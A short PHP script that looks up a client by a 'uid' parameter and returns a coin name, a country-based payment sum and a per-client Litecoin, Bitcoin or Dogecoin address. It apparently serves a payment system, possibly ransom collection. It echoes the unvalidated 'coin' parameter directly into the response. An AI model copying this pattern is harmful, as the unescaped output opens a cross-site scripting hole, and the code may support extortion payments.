<?php
	require_once realpath(dirname(__FILE__)) . '/../utils/db.php';
	
	if(empty($_GET["uid"])) {
		echo "";
		return;
	}
	
	$client = get_client($_GET["uid"])[0];
	
	if(empty($client)) {
		echo "";
		return;
	}
	
	$addresses = array(
		"LTC" => $client["address_ltc"],
		"BTC" => $client["address_btc"],
		"DOGE" => $client["address_doge"]
	);
	
	if(!array_key_exists($client["country"], PAYMENT_SUM)) {
		$client["country"] = "";
	}
	
	echo $_GET["coin"] . "|" . PAYMENT_SUM[$client["country"]][$_GET["coin"]] . "|" . $addresses[$_GET["coin"]];